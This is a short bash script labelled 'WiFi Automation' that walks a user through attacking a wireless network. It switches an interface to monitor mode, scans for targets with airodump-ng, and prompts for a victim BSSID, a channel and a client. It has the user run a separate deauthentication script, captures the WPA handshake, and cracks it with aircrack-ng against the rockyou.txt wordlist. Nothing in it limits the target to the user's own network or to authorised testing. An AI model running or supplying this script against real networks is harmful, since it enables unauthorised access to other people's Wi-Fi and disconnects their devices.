#!/bin/bash
clear
echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+"
echo "|W|i|F|i| |A|u|t|o|m|a|t|i|o|n|"
echo "+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+"
echo
echo Enter Interface Name:
read interface
printf "%s " "$interface" > data
echo "[i] setting interface to monitor mode."
sudo ifconfig $interface down
sudo iwconfig $interface mode monitor
sudo ifconfig $interface up
airodump-ng $interface &
sleep 10
killall airodump-ng
echo "Enter BSSID Of Target: "
read bssid
echo "chosen target: $bssid"
printf "%s " "$bssid" >> data
echo "Enter Channel Of Target: "
read channel
airodump-ng --ig -c $channel --bssid $bssid $interface &
sleep 10
killall airodump-ng
echo "enter client ID to perform Deauth attack: "
echo "[i] Run deauth.sh in a separate shell after pressing enter"
echo "[i] press ctrl + c after handshake capture"
read client
printf "%s" "$client" >> data
cat data 
airodump-ng --ig -w cap -c $channel --bssid $bssid $interface
aircrack-ng -J file cap*.cap
aircrack-ng -w rockyou.txt ./cap*.cap